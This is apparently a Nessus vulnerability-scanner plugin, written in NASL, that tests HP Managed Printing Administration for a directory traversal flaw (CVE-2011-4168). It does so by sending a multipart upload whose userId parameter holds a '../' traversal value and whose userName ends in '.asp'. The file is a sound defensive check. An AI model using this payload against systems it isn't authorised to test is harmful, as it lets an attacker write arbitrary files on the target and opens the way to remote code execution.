#
# (C) Tenable Networks Security, Inc.
#

include('compat.inc');

if (description)
{
  script_id(57701);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2014/08/09 00:11:22 $");

  script_cve_id("CVE-2011-4168");
  script_bugtraq_id(51174);
  script_osvdb_id(78017);

  script_name(english:"HP Managed Printing Administration jobDelivery Script Directory Traversal (intrusive check)");
  script_summary(english:"Attempts a directory traversal");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a web application that is affected by a
directory traversal vulnerability.");
  script_set_attribute(attribute:"description", value:
"The HP Managed Printing Administration install on the remote web
server is affected by a directory traversal vulnerability in the
'Default.asp' script.  A remote, unauthenticated attacker, exploiting
this flaw, could create arbitrary files on the remote host.

Note that the HP Managed Printing Administration install is likely
affected by multiple other flaws, though Nessus has not tested for
these.");

  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ad1b5d3c");
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-11-354/");
  script_set_attribute(attribute:"solution", value:"Upgrade to HP Managed Printing Administration version 2.6.4 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploithub_sku", value:"EH-11-262");
  script_set_attribute(attribute:"exploit_framework_exploithub", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'HP Managed Printing Administration jobAcct Remote Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/12/21");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/12/21");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/01/26");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:hp:managed_printing_administration");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2014 Tenable Network Security, Inc.");

  script_dependencies("hp_managed_printing_administration_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/hp_managed_printing_administration");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("webapp_func.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
install = get_install_from_kb(appname:'hp_managed_printing_administration', port:port, exit_on_fail:TRUE);

fname = SCRIPT_NAME+"-" + unixtime() + ".tmp";
userId = "/../../Database/NESSUS";
jobId = SCRIPT_NAME;
userName = unixtime()+'.asp';
docName = "aDoc";

url = '/hpmpa/jobDelivery/Default.asp?' +
  'userId=' + userId + '&' +
  'jobId=' + jobId + '&' +
  'docName=' + docName + '&' +
  'userName=' + userName;

# Try to upload a file.
bound = 'form';
boundary = '--' + bound;

postdata =
  boundary + '\r\n' +
  'Content-Disposition: form-data; name="fname"; filename="' + fname + '"' + '\r\n' +
  '\r\n' +
  SCRIPT_NAME + '\r\n' +
  boundary + '--' + '\r\n';

req = http_mk_post_req(
  port:port,
  item:url,
  add_headers:make_array(
    'Content-Disposition',  'form-data;',
    'Content-Type', 'multipart/form-data; boundary='+bound),
  data:postdata
);

res = http_send_recv_req(port:port, req:req, exit_on_fail:TRUE);

expectedres = userId+"-"+jobId+"-"+userName+'.prn';
if ('Results of Upload' >< res[2] &&
    'Saved' >< res[2] &&
    expectedres >< res[2]
)
{
  if (report_verbosity > 0)
  {
    report =
      '\n  Nessus detected this issue by sending the following request :\n\n' +
      crap(data:'-', length:30) + ' snip ' + crap(data:'-', length:30) + '\n' +
      http_mk_buffer_from_req(req:req) + '\n' +
      crap(data:'-', length:30) + ' snip ' + crap(data:'-', length:30) + '\n';

    if (report_verbosity > 1)
    {
      file = strstr(res[2], 'Saved');
      file = file - strstr(file, '<br');
      chomp(file);
      report +=
        '\n  Which created the following output :\n\n' +
        crap(data:'-', length:30) + ' snip ' + crap(data:'-', length:30) + '\n' +
        file + '\n' +
        crap(data:'-', length:30) + ' snip ' + crap(data:'-', length:30) + '\n';
    }
    security_warning(port:port, extra:report);
  }
  else security_warning(port:port);
  exit(0);
}
else
{
  hp_mpa_site = build_url(qs:install['dir'], port:port);
  exit(0, 'The HP Managed Printing Administration site at ' + hp_mpa_site + ' is not affected.');
}
